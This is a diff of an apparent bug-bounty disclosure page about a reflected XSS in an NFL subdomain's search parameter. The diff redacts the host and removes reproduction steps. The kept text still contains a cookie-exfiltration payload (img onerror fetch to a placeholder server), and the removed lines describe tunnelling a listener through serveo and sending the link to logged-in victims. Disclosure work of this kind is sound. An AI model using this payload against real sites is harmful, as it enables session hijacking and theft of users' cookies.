@@ -22,10 +22,7 @@ official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279
 
   <div class="bounty-content">
     <h2>🎯 Vulnerability Summary</h2>
-    <p>We identified a Reflected Cross-Site Scripting (XSS) vulnerability on the public-facing domain <code>hbcutournament.nfl.com</code>. The vulnerability resides in the search results page URL fragment (<code>?q=</code>) parameter, which improperly processes user-supplied input without adequate sanitization.</p>
-
-    <h2>⚙️ Affected URLs</h2>
-    <pre><code>https://hbcutournament.nfl.com/{resources,blogs}?q=</code></pre>
+    <p>We identified a Reflected Cross-Site Scripting (XSS) vulnerability on the public-facing domain <code>[REDACTED].nfl.com</code>. The vulnerability resides in the search results page URL fragment (<code>?q=</code>) parameter, which improperly processes user-supplied input without adequate sanitization.</p>
 
     <h2>🛠️ Proof of Concept Payloads</h2>
     
@@ -44,15 +41,6 @@ official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279
     <pre><code>&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></pre>
     <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration.png" alt="Cookies Exfiltration Payload">
     <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration Result.png" alt="Exfiltration Result">
-
-    <h2>🚀 Steps to Reproduce</h2>
-    <ol>
-      <li>Start a local Web Server: <code>python3 -m http.server 8000</code></li>
-      <li>Expose it publicly (e.g., using Serveo): <code>ssh -R 80:localhost:8000 serveo.net</code></li>
-      <li>Prepare the malicious URL with your server address.</li>
-      <li>Share the URL with an authenticated user.</li>
-      <li>Receive victim cookies in your side.</li>
-    </ol>
 
     <h2>🤝 Collaboration Details</h2>
     <p>This research was conducted in a joint effort with the following researchers:</p>
